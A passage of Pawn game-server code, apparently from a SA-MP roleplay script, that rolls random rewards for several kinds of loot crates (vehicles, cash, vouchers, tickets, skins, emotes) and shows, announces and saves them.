					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1247);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium points~n~~y~300x");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a transcendent crate and won 300x Premium Points. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
						PlayerInfo[i][pPremiumPoints] += 300;
						UpdateVar(i, "GoldPoints", PlayerInfo[i][pPremiumPoints]);
						CrateModel[i] = -1;
						return true;
				    }
		        }
		       	case 41..46: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 519);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~shamal");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a mythic crate and won shamal. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 519);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }
		        }
		   		default: {
		            amount = RandomEx(10000000, 20000000);
		            format(gString, 65, "money~n~~g~$%s", FormatNumber(amount));
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a transcendent crate and won $%s. ))", GetName(i), FormatNumber(amount)); SCMTA(COLOR_CLIENT, crateString);
					   	
					   	GivePlayerCash(i, amount);
					    CrateModel[i] = -1;
						return true;
			        }
		        }
		    }
		}
		case 5: {
			switch(random(100)) {
				case 0..10: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 522);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~NRG 500");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a vehicle crate and won NRG-500. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 522);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 11..20: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 451);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~Turismo");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a vehicle crate and won Turismo. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 451);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 21..26: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 560);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~g~Sultan");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a vehicle crate and won Sultan [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 560, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 27..40: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 600);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~Picador");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a vehicle crate and won Picador. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 600);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 41..60: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 468);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~Sanchez");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a vehicle crate and won Sanchez. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 468);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				default: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 365);
					PlayerTextDrawSetString(i, CratePTD[i][1], "hiddens~n~~y~10x");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a vehicle crate and won 10x Hiddens. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					   	
					   	PlayerInfo[i][pHidden] += 10;
					   	UpdateVar(i, "Hidden", PlayerInfo[i][pHidden]);
					    CrateModel[i] = -1;
						return true;
			        }				
				}
			}
		}
		case 6: {
			switch(random(100)) {
		    	case 0..20: {
		    		amount = random(11);
		            format(gString, 30, "emote~n~~p~%s", emoteInfo[amount][emoteName]);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], emoteInfo[amount][emoteObject]);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(PlayerInfo[i][pEmotes][amount]) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i);
	            		    SendClientMessage(i, COLOR_CLIENT, "[CRATE] Pentru ca nu ai sloturi disponibile pentru emotes ai primit cutia inapoi.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a emotes crate and won Emote (%s). ))", GetName(i), emoteInfo[amount][emoteName]);
						   	SCMTA(COLOR_CLIENT, crateString);
						   	PlayerInfo[i][pEmotes][amount] = true;
						   	save_emotes(i);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
		        case 21..40: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "voucher~n~~b~EPIC");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a emotes crate and won epic voucher. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pVoucher][1]++;
					   	save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }			
		        }
		        case 41..60: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 481);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~BMX");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a emotes crate and won BMX. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 481);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }			
		        }
		        case 61..99: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1275);
					PlayerTextDrawSetString(i, CratePTD[i][1], "b-hood points~n~~p~1000x");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a emotes crate and won 1000 BPoints. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					    givePoints(i, 1000);
					    CrateModel[i] = -1;
						return true;
			        }
		        }
		        default: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1314);
					PlayerTextDrawSetString(i, CratePTD[i][1], "respect points~n~~y~25x");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a emotes crate and won 25x Respect Points. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					    PlayerInfo[i][pExp] += 25;
					    UpdateVar(i, "Respect", PlayerInfo[i][pExp]);
						CrateModel[i] = -1;
						return true;
				    }
		        }
		    }
		}
		case 7: {
			switch(random(100)) {
				case 0..3: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 493);
					PlayerTextDrawSetString(i, CratePTD[i][1], "FULL~n~~g~Jetmax");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a summer crate and won Jetmax [FULL]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 493);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 4..7: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 424);
					PlayerTextDrawSetString(i, CratePTD[i][1], "PREMIUM~n~~g~BF INJECTION");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a summer crate and won BF Injection [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 424, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 8..12: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18647);
					PlayerTextDrawSetString(i, CratePTD[i][1], "RED~n~NEON T.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won red neon ticket. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pNeonTickets][5]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }							
				}
				case 13..17: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18652);
					PlayerTextDrawSetString(i, CratePTD[i][1], "WHITE~n~NEON T.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won white neon ticket. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pNeonTickets][0]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 18..23: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 544);
					PlayerTextDrawSetString(i, CratePTD[i][1], "VEHICLE~n~~b~FIRETRUCK");
					PlayerTextDrawShow(i, CratePTD[i][0]);			
				    if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a summer crate and won Firetruck. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 544);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }		
				}
				case 24..30: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "VOUCHER~n~~b~MYTHIC");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won Mythic Voucher. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pVoucher][3]++;
					   	save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }						
				}
				case 31..40: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "BATTLEPASS P.~n~TICKET");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won Battlepass Premium Ticket. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pTickets][7]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 41..60: {
					amount = loadSkins[e_SKIN_SUMMERV2][random(sizeof(loadSkins[e_SKIN_SUMMERV2]))];
		            format(gString, 30, "~y~~h~summer v2~n~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a summer crate and won Skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						    
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }					
				}
				case 61..65: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "voucher~n~~b~rare");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won Rare Voucher. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pVoucher][0]++;
					   	save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }			
				}
				case 66..70: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "sws~n~ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won SWS Ticket. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pTickets][4]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }				
				}
				case 71..80: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 2410);
					PlayerTextDrawSetString(i, CratePTD[i][1], "surf~n~~w~object");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won Surf Board. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					 	
						PlayerInfo[i][pAccessories][13] ++;
						save_accesories(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 81..90: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 645);
					PlayerTextDrawSetString(i, CratePTD[i][1], "palm~n~~w~object");
					PlayerTextDrawShow(i, CratePTD[i][0]);
					if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won pet palm. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					 	
					 	if(PlayerInfo[i][pSpecialPet][5]) {
					 		SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece ai deja acest pet!");
					 	} else {
					 		PlayerInfo[i][pSpecialPet][5] = 1;
					 		_query("UPDATE `users` SET `special_pet`='%d %d %d %d %d %d' WHERE `ID`='%d'", PlayerInfo[i][pSpecialPet][0], PlayerInfo[i][pSpecialPet][1], PlayerInfo[i][pSpecialPet][2],PlayerInfo[i][pSpecialPet][3], PlayerInfo[i][pSpecialPet][4], PlayerInfo[i][pSpecialPet][5], PlayerInfo[i][pSQLID]);
					 	}
						CrateModel[i] = -1;
						return true;
					}
				}
				default: {
					amount = RandomEx(1000000, 700000000);
		            format(gString, 65, "money~n~~g~$%s", FormatNumber(amount));
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a summer crate and won $%s. ))", GetName(i), FormatNumber(amount)); SCMTA(COLOR_CLIENT, crateString);
					   	
					   	GivePlayerCash(i, amount);
					    CrateModel[i] = -1;
						return true;
			        }					
				}
			}
		}
		case 8: {
			switch(random(100)) {
				case 0..3: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "voucher~n~~b~Millionaires");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium crate and won Millionaires Voucher. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pVoucher][4]++;
					   	save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }				
				}
				case 4..9: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "voucher~n~~b~Legendary");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium crate and won Legendary Voucher. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
					    
					   	PlayerInfo[i][pVoucher][3]++;
					   	save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 10..15: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 411);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~Infernus");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won Infernus [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 411, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 16..20: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 502);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~hotring racer A");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won Hotring Racer A [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 502, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 21..26: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 503);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~hotring racer B");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won Hotring Racer B [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 503, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 27..37: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 494);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~hotring racer C");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won Hotring Racer C [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 494, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 38..44: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 521);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~FCR-900");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won FCR-900 [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 521, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 45..50: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 455);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~Flatbed");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won Flatbed [PREMIUM]. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						    
						    GiveVehicle(i, 455, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 51..75: {
					amount = loadSkins[e_SKIN_PREMIUM][random(sizeof(loadSkins[e_SKIN_PREMIUM]))];
		            format(gString, 30, "~y~~h~premium~n~~w~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a premium crate and won Skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); SCMTA(COLOR_CLIENT, crateString);
						    
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
				case 76..82: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1242);
		            PlayerTextDrawSetString(i, CratePTD[i][1], "~b~police~n~~w~armour");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		format(crateString, 120,"(( Crate: %s opened a premium crate and won Police Armour. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						
	            		return true;
		            }
				}
				case 83..90: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 321);
		            PlayerTextDrawSetString(i, CratePTD[i][1], "~p~dildo~w~~n~object");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		format(crateString, 120,"(( Crate: %s opened a premium crate and won Dildo Object. ))", GetName(i)); SCMTA(COLOR_CLIENT, crateString);
						
	            		return true;
		            }
				}
				default: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], "money~n~~g~$500.000.000");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium crate and won $500.000.000. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	GivePlayerCash(i, 500000000);
						CrateModel[i] = -1;
						return true;
				    }
				}
			}
		}
		case 9: {
			switch random(100) 
			do {
				case 0..13: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vip ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won VIP Ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pTickets][1]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}

				case 14..28: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "rainbow ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won Rainbow Ticket. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pTickets][0]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}

				case 29..33: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "fuel ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won Premium Fuel Ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pTickets][2]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 34: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "house ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won House Ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pTickets][3]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}

				case 35: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 495);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~sandking");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won Sandking [PREMIUM]. ))", GetName(i)); 
						    SCMTA(COLOR_CLIENT, crateString);
						    GiveVehicle(i, 495, true);
						} else {
